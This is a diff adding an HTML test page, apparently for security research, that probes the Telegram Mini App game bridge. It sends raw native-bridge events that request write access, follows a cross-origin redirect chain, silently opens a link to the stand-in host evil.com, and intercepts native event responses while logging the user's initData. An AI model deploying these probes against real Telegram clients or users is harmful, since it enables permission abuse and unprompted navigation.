@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Game — bridge in game context</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+  :root { color-scheme: dark; }
+  body { margin:0; font:13px/1.45 monospace; background:#111; color:#ddd; padding:12px; }
+  h1 { font-size:15px; margin:0 0 8px; color:#ffd54f; }
+  button { width:100%; padding:12px; margin:4px 0; font:13px monospace; border-radius:8px;
+           border:1px solid #444; background:#222; color:#eee; }
+  #log { white-space:pre-wrap; background:#000; color:#9f9; padding:8px; border-radius:6px; max-height:40vh; overflow:auto; }
+  .warn { color:#f66; }
+</style>
+</head>
+<body>
+<h1>Game-context bridge test</h1>
+<div id="log">log:</div>
+<button onclick="probe()">1. Проверить мост в игровом контексте</button>
+<button onclick="crossRedirect()">2. Кросс-origin редирект-цепочка (httpbin) → обратно, мост жив?</button>
+<button onclick="silentLink()">3. Молчаливый openLink из игры</button>
+<button onclick="shareScore()">4. shareScore / game API</button>
+
+<script>
+const tg = window.Telegram?.WebApp;
+const qs = new URLSearchParams(location.search);
+const logBox = document.getElementById('log');
+function log(s, cls){ const d=document.createElement('div'); d.textContent='› '+s; if(cls) d.className=cls; logBox.parentNode.insertBefore(d, logBox.nextSibling); }
+function invokeRaw(obj){
+  try { window.external.invoke(JSON.stringify(obj)); return 'sent'; }
+  catch(e){ return 'EXC: '+e.message; }
+}
+if (tg){ tg.ready(); tg.expand(); }
+log('platform='+(tg?tg.platform:'нет WebApp')+' after='+(qs.get('after')||'первая загрузка'));
+if (tg?.initData) log('initData: '+tg.initData.slice(0,160));
+if (tg?.initDataUnsafe) log('initDataUnsafe keys: '+Object.keys(tg.initDataUnsafe).join(','));
+
+function probe(){
+  log('tg='+(!!tg)+' external.invoke='+(typeof window.external?.invoke));
+  log('write_access ⇒ '+invokeRaw({eventType:'web_app_request_write_access'}));
+  log('theme_req ⇒ '+invokeRaw({eventType:'web_app_request_theme'}));
+  log('viewport ⇒ '+invokeRaw({eventType:'web_app_request_viewport'}));
+}
+function crossRedirect(){
+  const back = encodeURIComponent(location.origin + location.pathname + '?after=redirect');
+  log('уходим через httpbin (чужой origin в цепочке)…');
+  location.href = 'https://httpbin.org/redirect-to?url=' + back + '&status_code=302';
+}
+if (qs.get('after')==='redirect'){
+  log('*** ВЕРНУЛИСЬ после кросс-origin цепочки ***', 'warn');
+  probe();
+}
+function silentLink(){ log('openLink ⇒ '+invokeRaw({eventType:'web_app_open_link',data:{url:'https://evil.com/?from=game'}})); }
+function shareScore(){ try { tg?.shareScore?.(); log('shareScore вызван'); } catch(e){ log('shareScore: '+e.message); } }
+
+// перехват ответов натива
+if (window.TelegramGameProxy){
+  const orig = window.TelegramGameProxy.receiveEvent;
+  window.TelegramGameProxy.receiveEvent = function(ev,data){
+    log('⇐ '+ev+' '+String(typeof data==='string'?data:JSON.stringify(data||null)).slice(0,90));
+    return orig && orig.apply(this,arguments);
+  };
+}
+log('game-страница готова');
+</script>
+</body>
+</html>
